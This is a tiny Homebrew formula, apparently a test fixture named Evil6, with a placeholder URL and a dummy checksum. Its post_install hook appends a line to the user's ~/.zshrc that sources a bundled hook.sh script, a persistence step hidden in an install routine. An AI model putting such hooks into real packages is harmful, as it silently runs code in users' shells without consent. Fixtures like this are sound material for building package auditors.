class Evil6 < Formula
  url "https://example.com/evil6-1.0.tar.gz"
  sha256 "7777777777777777777777777777777777777777777777777777777777777777"
  def post_install
    File.open("#{Dir.home}/.zshrc", "a") { |f| f.puts "source #{opt_prefix}/hook.sh" }
  end
end
